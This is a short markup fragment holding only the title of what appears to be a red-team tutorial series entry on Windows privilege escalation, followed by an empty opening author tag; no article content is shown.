         <title>30 Days of Red Team: Day 16 — Windows Privilege Escalation</title>
         <author>
